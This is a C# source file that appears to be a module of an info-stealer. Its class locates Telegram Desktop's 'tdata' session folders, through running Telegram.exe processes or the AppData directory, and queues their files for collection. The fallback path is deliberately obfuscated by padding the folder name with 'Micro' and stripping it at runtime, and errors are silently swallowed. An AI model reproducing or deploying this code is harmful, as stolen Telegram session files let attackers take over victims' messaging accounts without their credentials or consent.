using System;
using System.Collections.Generic;
using System.IO;
using WindowsSDK.Helpers;
using WindowsSDK.Objects.Files;

namespace WindowsSDK.Data.Files.Rules
{
    public class DesktopMessangerRule : FileScannerRule
    {
        public List<string> PassedPaths { get; set; } = new List<string>();


        public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
        {
            string result = "Profile_Unknown";
            try
            {
                DirectoryInfo directory = fileInfo.Directory;
                string text = string.Empty;
                if (directory.Name != "tdata")
                {
                    text = directory.FullName.Split(new string[1] { "tdata" }, StringSplitOptions.RemoveEmptyEntries)[1];
                }
                return "Profile_" + scannerArg.Tag + (string.IsNullOrWhiteSpace(text) ? "" : ("\\" + text));
            }
            catch
            {
                return result;
            }
        }

        public override IEnumerable<FileScannerArg> GetScanArgs()
        {
            List<FileScannerArg> list = new List<FileScannerArg>();
            try
            {
                int num = 1;
                foreach (string item in SystemInfoHelper.GetProcessesByName("Telegram.exe"))
                {
                    try
                    {
                        list.Add(new FileScannerArg
                        {
                            Tag = num.ToString(),
                            Pattern = "*",
                            Directory = new FileInfo(item).Directory.FullName + "\\tdata",
                            Recoursive = false
                        });
                        string[] directories = Directory.GetDirectories(new FileInfo(item).Directory.FullName + "\\tdata");
                        foreach (string text in directories)
                        {
                            if (new DirectoryInfo(text).Name.Length == 16)
                            {
                                list.Add(new FileScannerArg
                                {
                                    Tag = num.ToString(),
                                    Pattern = "*",
                                    Directory = text,
                                    Recoursive = false
                                });
                            }
                        }
                        num++;
                    }
                    catch (Exception)
                    {
                    }
                }
                if (list.Count == 0)
                {
                    string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[43]
                    {
                        '\\', 'T', 'e', 'l', 'e', 'M', 'i', 'c', 'r', 'o',
                        'g', 'r', 'a', 'm', ' ', 'D', 'M', 'i', 'c', 'r',
                        'o', 'e', 's', 'k', 't', 'M', 'i', 'c', 'r', 'o',
                        'o', 'p', '\\', 't', 'd', 'M', 'i', 'c', 'r', 'o',
                        'a', 't', 'a'
                    }).Replace("Micro", string.Empty);
                    list.Add(new FileScannerArg
                    {
                        Tag = num.ToString(),
                        Pattern = "*",
                        Directory = text2,
                        Recoursive = false
                    });
                    string[] directories = Directory.GetDirectories(text2);
                    foreach (string text3 in directories)
                    {
                        if (new DirectoryInfo(text3).Name.Length == 16)
                        {
                            list.Add(new FileScannerArg
                            {
                                Tag = num.ToString(),
                                Pattern = "*",
                                Directory = text3,
                                Recoursive = false
                            });
                        }
                    }
                }
            }
            catch
            {
            }
            return list;
        }
    }
}
